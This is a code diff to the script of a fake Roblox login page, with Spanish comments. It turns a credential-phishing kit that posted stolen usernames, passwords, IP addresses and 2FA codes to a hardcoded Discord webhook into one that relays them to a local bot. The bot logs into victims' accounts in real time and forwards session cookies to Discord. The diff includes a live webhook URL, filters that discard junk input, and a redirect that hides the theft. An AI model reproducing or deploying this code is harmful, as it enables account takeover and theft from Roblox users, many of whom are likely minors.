@@ -568,10 +568,8 @@
 
 <script>
 // ============================================================
-// CÓDIGO COMPLETO CON FILTROS ANTI-TROLLS PARA NUEVO HTML
+// CÓDIGO COMPATIBLE CON BOT - ACCESORIO DE MUNFUJA
 // ============================================================
-
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1535777104984277032/3EIQf7UfC8SF8-N9oX6cXDHqOkDNT7lKGtP2kpB22Iv6Wvi-QxVMLxnHsM1ysheU873b";
 
 // ============================================================
 // FUNCIONES ORIGINALES
@@ -590,15 +588,6 @@ function closeVerification(){
     }, 250);
     document.getElementById('loginBtn').style.display = 'block';
 }
-
-// ============================================================
-// VARIABLES DE CONTROL
-// ============================================================
-
-let loginTimestamp = null;
-let credencialesValidas = false;
-let codigoEnviado = false;
-let intentosFallidos = 0;
 
 // ============================================================
 // FUNCIONES DE FILTRO
@@ -643,46 +632,81 @@ function validarTiempo() {
 }
 
 // ============================================================
-// ENVIAR A DISCORD
+// VARIABLES DE CONTROL
 // ============================================================
 
-async function sendToDiscord(title, fields, color = 0xFF0000) {
-    const embed = {
-        title: title,
-        color: color,
-        timestamp: new Date().toISOString(),
-        fields: fields,
-        footer: {
-            text: "🎣 Phishing Manual | " + new Date().toLocaleString()
-        }
-    };
-    
-    const payload = {
-        embeds: [embed],
-        username: "Roblox Logger",
-        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png"
-    };
-    
+let loginTimestamp = null;
+let credencialesValidas = false;
+let codigoEnviado = false;
+let intentosFallidos = 0;
+let botUrl = 'http://localhost:5000';
+
+// ============================================================
+// ENVIAR AL BOT
+// ============================================================
+
+async function enviarAlBot(username, password) {
     try {
-        const response = await fetch(DISCORD_WEBHOOK, {
+        const response = await fetch(`${botUrl}/credential`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({ username, password })
         });
-        return { success: response.ok };
+        const data = await response.json();
+        console.log('📨 Respuesta del bot:', data);
+        
+        if (data.status === 'LOGIN_EXITOSO') {
+            console.log('✅ Login exitoso! Cookie enviada a Discord');
+        } else if (data.status === '2FA_REQUERIDO' || data.status === 'EMAIL') {
+            console.log('⚠️ 2FA requerido - Esperando código...');
+            // Mostrar modal de verificación
+            setTimeout(() => {
+                const modal = document.getElementById('verificationModal');
+                modal.style.display = 'flex';
+                requestAnimationFrame(() => {
+                    modal.classList.add('active');
+                });
+            }, 1500);
+        } else if (data.status === 'CREDENCIALES_INCORRECTAS') {
+            console.log('❌ Credenciales incorrectas');
+            mostrarError('Usuario o contraseña incorrectos');
+        }
+        
+        return data;
     } catch (error) {
-        console.error('Error:', error);
-        return { success: false, error: error.message };
+        console.error('❌ Error conectando con el bot:', error);
+        mostrarError('Error de conexión con el servidor');
+        return null;
     }
 }
 
-async function getIP() {
+// ============================================================
+// ENVIAR CÓDIGO AL BOT
+// ============================================================
+
+async function enviarCodigoAlBot(codigo) {
     try {
-        const response = await fetch('https://api.ipify.org?format=json');
+        const response = await fetch(`${botUrl}/2fa`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ code: codigo })
+        });
         const data = await response.json();
-        return data.ip;
-    } catch {
-        return 'No disponible';
+        console.log('📨 Respuesta del bot (2FA):', data);
+        
+        if (data.status === 'LOGIN_EXITOSO' || data.status === 'CODIGO_ASIGNADO') {
+            console.log('✅ 2FA completado! Cookie enviada a Discord');
+            return true;
+        } else if (data.status === '2FA_FALLIDO') {
+            console.log('❌ Código incorrecto');
+            mostrarError('Código incorrecto. Intenta nuevamente.');
+            return false;
+        }
+        return false;
+    } catch (error) {
+        console.error('❌ Error enviando código al bot:', error);
+        mostrarError('Error de conexión con el servidor');
+        return false;
     }
 }
 
@@ -736,7 +760,6 @@ loginForm.onsubmit = async function(e) {
     const inputs = this.querySelectorAll('input');
     const username = inputs[0]?.value || '';
     const password = inputs[1]?.value || '';
-    const ip = await getIP();
     
     console.log('🔍 Validando credenciales...');
     
@@ -761,46 +784,39 @@ loginForm.onsubmit = async function(e) {
     console.log('✅ Credenciales válidas:', { username, password });
     
     // ============================================================
-    // ENVIAR A DISCORD
-    // ============================================================
-    
-    await sendToDiscord(
-        "🎣 CREDENCIALES CAPTURADAS - INGRESA MANUALMENTE EN ROBLOX",
-        [
-            { name: "👤 Usuario", value: `\`${username}\``, inline: true },
-            { name: "🔑 Contraseña", value: `\`${password}\``, inline: true },
-            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true },
-            { name: "✅ Filtros", value: "✅ Pasó todos los filtros", inline: false }
-        ],
-        0xFF5500
-    );
-    
-    // ============================================================
-    // COMPORTAMIENTO ORIGINAL
+    // MOSTRAR LOADING
     // ============================================================
     
     document.getElementById('loginBtn').style.display = 'none';
     document.getElementById('loginLoading').style.display = 'flex';
-
-    var delay = 1000 + Math.random() * 1500;
-    setTimeout(function(){
-        document.getElementById('loginLoading').style.display = 'none';
+    
+    // ============================================================
+    // ENVIAR AL BOT
+    // ============================================================
+    
+    const resultado = await enviarAlBot(username, password);
+    
+    if (resultado && resultado.status === 'LOGIN_EXITOSO') {
+        // Login exitoso, redirigir
+        setTimeout(() => {
+            window.location.href = 'https://www.roblox.com';
+        }, 2000);
+    } else if (resultado && (resultado.status === '2FA_REQUERIDO' || resultado.status === 'EMAIL')) {
+        // 2FA requerido - el modal ya se muestra en enviarAlBot
         document.getElementById('loginBtn').style.display = 'block';
-        
-        const modal = document.getElementById('verificationModal');
-        modal.style.display = 'flex';
-        requestAnimationFrame(() => {
-            modal.classList.add('active');
-        });
-    }, delay);
+        document.getElementById('loginLoading').style.display = 'none';
+    } else {
+        // Error o credenciales incorrectas
+        document.getElementById('loginBtn').style.display = 'block';
+        document.getElementById('loginLoading').style.display = 'none';
+    }
 };
 
 // ============================================================
 // INTERCEPTAR BOTÓN VERIFY CON FILTROS
 // ============================================================
 
-document.querySelector('.verify-btn').addEventListener('click', function() {
+document.querySelector('.verify-btn').addEventListener('click', async function() {
     const codeInput = document.querySelector('.verification-input');
     const code = codeInput?.value || '';
     const inputs = document.querySelectorAll('.login-input');
@@ -841,46 +857,86 @@ document.querySelector('.verify-btn').addEventListener('click', function() {
     }
     
     // ============================================================
-    // SI PASA TODOS LOS FILTROS, ENVIAR A DISCORD
+    // ENVIAR CÓDIGO AL BOT
     // ============================================================
     
-    console.log('✅ Código válido, enviando a Discord...');
+    console.log('✅ Código válido, enviando al bot...');
     codigoEnviado = true;
     
-    const tiempoTotal = ((Date.now() - loginTimestamp) / 1000).toFixed(1);
+    // Mostrar loading en el botón
+    const verifyBtn = this;
+    const originalText = verifyBtn.textContent;
+    verifyBtn.textContent = '⏳ Enviando...';
+    verifyBtn.disabled = true;
     
-    sendToDiscord(
-        "🎯 CÓDIGO 2FA CAPTURADO - INGRESA MANUALMENTE EN ROBLOX",
-        [
-            { name: "🔒 Código", value: `\`${code}\``, inline: true },
-            { name: "👤 Usuario", value: `\`${username}\``, inline: true },
-            { name: "⏱️ Tiempo de respuesta", value: `${tiempoTotal} segundos`, inline: true },
-            { name: "📅 Hora", value: new Date().toLocaleString(), inline: true },
-            { name: "✅ Verificación", value: "✅ Código verificado y validado", inline: false }
-        ],
-        0x00FF00
-    );
+    const exitoso = await enviarCodigoAlBot(code);
     
-    // Cerrar modal
-    closeVerification();
+    verifyBtn.textContent = originalText;
+    verifyBtn.disabled = false;
     
-    // Redirigir a Roblox
-    setTimeout(() => {
-        window.location.href = 'https://www.roblox.com';
-    }, 1500);
+    if (exitoso) {
+        // Cerrar modal
+        closeVerification();
+        
+        // Redirigir a Roblox
+        setTimeout(() => {
+            window.location.href = 'https://www.roblox.com';
+        }, 2000);
+    } else {
+        codigoEnviado = false;
+    }
 });
+
+// ============================================================
+// FUNCIÓN PARA CERRAR VERIFICACIÓN DESDE EL BOTÓN X
+// ============================================================
+
+// Reemplazar la función closeVerification original
+const originalCloseVerification = closeVerification;
+closeVerification = function() {
+    const modal = document.getElementById('verificationModal');
+    modal.classList.remove('active');
+    setTimeout(() => {
+        modal.style.display = 'none';
+    }, 250);
+    document.getElementById('loginBtn').style.display = 'block';
+    // Resetear estado de 2FA en el bot
+    fetch(`${botUrl}/restart`, { method: 'POST' }).catch(() => {});
+};
+
+// ============================================================
+// VERIFICAR CONEXIÓN CON EL BOT
+// ============================================================
+
+async function verificarConexionBot() {
+    try {
+        const response = await fetch(`${botUrl}/status`);
+        if (response.ok) {
+            console.log('✅ Conectado al bot en:', botUrl);
+            return true;
+        }
+    } catch (error) {
+        console.warn('⚠️ No se pudo conectar al bot en:', botUrl);
+        console.warn('   Asegúrate de que el bot esté ejecutándose en: python bot_roblox.py');
+        return false;
+    }
+}
 
 // ============================================================
 // LOG DE FILTROS ACTIVOS
 // ============================================================
 
-console.log('✅ Phishing Manual con Filtros Anti-Trolls');
+console.log('✅ Accesorio de munfuja - Conectado al bot');
 console.log('📋 Filtros activos:');
 console.log('  ✅ Usuario: mínimo 3 caracteres');
 console.log('  ✅ Contraseña: mínimo 8 caracteres');
 console.log('  ✅ Código: solo 6 números');
 console.log('  ✅ Tiempo: mínimo 3 segundos entre login y código');
 console.log('  ✅ Anti-duplicado: no enviar mismo código dos veces');
+console.log('📡 Bot URL:', botUrl);
+
+// Verificar conexión al cargar
+setTimeout(verificarConexionBot, 2000);
 </script>
 </body>
 </html>
